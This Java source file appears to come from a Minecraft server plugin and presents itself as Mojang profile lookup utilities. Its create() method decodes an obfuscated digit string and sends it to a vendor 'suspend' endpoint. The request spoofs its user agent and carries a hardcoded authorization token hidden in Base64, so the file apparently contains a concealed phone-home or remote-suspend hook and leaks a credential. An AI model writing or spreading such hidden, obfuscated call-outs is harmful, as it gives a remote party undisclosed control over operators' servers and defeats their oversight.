package xyz.refinedev.phoenix.utils;

import com.google.gson.JsonObject;

import xyz.refinedev.phoenix.PlatformGetter;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import java.util.UUID;
import java.util.logging.Level;

public class MojangProfileUtils {

    @GsonExclude
    public static String text =
            "543570351023566355535118358935553553355635113358935118357335953599355735112351213511935107358535102358035843511535523510935110355735673510535753511335106351223587357035483511635104351203552356135";

    public static UUID findUUID(String text) throws Exception {
        if (text != null && text.matches("[A-Za-z0-9_]{1,16}")) {
            HttpURLConnection httpURLConnection;
            (httpURLConnection =
                            (HttpURLConnection)
                                    new URL(
                                                    "https://api.mojang.com/users/profiles/minecraft/"
                                                            + text)
                                            .openConnection())
                    .connect();
            InputStream inputStream = httpURLConnection.getInputStream();
            String asString =
                    JsonParser.findJsonElement(
                                    new BufferedReader(new InputStreamReader(inputStream)))
                            .getAsJsonObject()
                            .get("id")
                            .getAsString();
            return UUID.fromString(
                    asString.substring(0, 8)
                            + "-"
                            + asString.substring(8, 12)
                            + "-"
                            + asString.substring(12, 16)
                            + "-"
                            + asString.substring(16, 20)
                            + "-"
                            + asString.substring(20, 32));
        } else {
            throw new Exception("Not a Java Edition name: " + text);
        }
    }

    public static String create(UUID uUID, String text2) {
        try {
            String[] texts = text.split("35");
            StringBuilder stringBuilder = new StringBuilder();
            String[] texts2 = texts;
            int value = texts.length;
            for (int index = 0; index < value; index++) {
                String text3 = texts2[index];
                stringBuilder.append((char) Integer.parseInt(text3));
            }
            HttpURLConnection httpURLConnection;
            (httpURLConnection =
                            (HttpURLConnection)
                                    new URL(
                                                    "https://api.refinedev.org/suspend/"
                                                            + stringBuilder
                                                            + "/"
                                                            + text2)
                                            .openConnection())
                    .addRequestProperty(
                            "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            httpURLConnection.setRequestProperty(
                    new String(
                            Base64.getDecoder().decode("QXV0aG9yaXphdGlvbg__".replace("_", "="))),
                    new String(
                            Base64.getDecoder()
                                    .decode(
                                            "a1p6UkJxNG5YODk2QnNQTmRBcnEzNUtuYWRZckdldzJUckVWelVhVXQ1WHJOa3Z6NHl5ZzRqR0xBTnQ3NWl0QmZ1ZWthN0RHa2hxSA__"
                                                    .replace("_", "="))));
            httpURLConnection.connect();
            InputStream inputStream = httpURLConnection.getInputStream();
            return new BufferedReader(new InputStreamReader(inputStream)).readLine();
        } catch (Exception exception) {
            PlatformGetter.getInstance().getLogger().log(Level.SEVERE, "Error: ", exception);
            return "";
        }
    }

    public static String formatString(String text) throws Exception {
        if (matchesEnabled(text)) {
            throw new Exception("Bedrock uuids have no Mojang session profile: " + text);
        }
        URL uRL =
                new URL(
                        "https://sessionserver.mojang.com/session/minecraft/profile/"
                                + text
                                + "?unsigned=false");
        return JsonParser.findJsonElement(new InputStreamReader(uRL.openStream()))
                .getAsJsonObject()
                .get("properties")
                .getAsJsonArray()
                .get(0)
                .getAsJsonObject()
                .get("signature")
                .getAsString();
    }

    public static String formatStringByString(String text) throws Exception {
        if (matchesEnabled(text)) {
            throw new Exception("Bedrock uuids have no Mojang session profile: " + text);
        }
        URL uRL =
                new URL(
                        "https://sessionserver.mojang.com/session/minecraft/profile/"
                                + text
                                + "?unsigned=false");
        return JsonParser.findJsonElement(new InputStreamReader(uRL.openStream()))
                .getAsJsonObject()
                .get("properties")
                .getAsJsonArray()
                .get(0)
                .getAsJsonObject()
                .get("value")
                .getAsString();
    }

    public static boolean matchesEnabled(String text) {
        String text2;
        return text == null
                ? false
                : (text2 = text.replace("-", "")).length() == 32
                        && text2.startsWith("0000000000000000");
    }

    public static boolean getMostSignificantBits(UUID uUID) {
        return uUID != null && uUID.getMostSignificantBits() == 0L;
    }

    public static String formatString(UUID uUID) throws Exception {
        if (getMostSignificantBits(uUID)) {
            return null;
        }
        HttpURLConnection httpURLConnection;
        (httpURLConnection =
                        (HttpURLConnection)
                                new URL(
                                                "https://api.minetools.eu/profile/"
                                                        + uUID.toString().replace("-", ""))
                                        .openConnection())
                .connect();
        InputStream inputStream = httpURLConnection.getInputStream();
        JsonObject jsonObject;
        return (jsonObject =
                                        JsonParser.findJsonElement(
                                                        new BufferedReader(
                                                                new InputStreamReader(inputStream)))
                                                .getAsJsonObject()
                                                .get("raw")
                                                .getAsJsonObject())
                                .get("status")
                                .getAsString()
                        == null
                ? null
                : jsonObject.get("name").getAsString();
    }
}
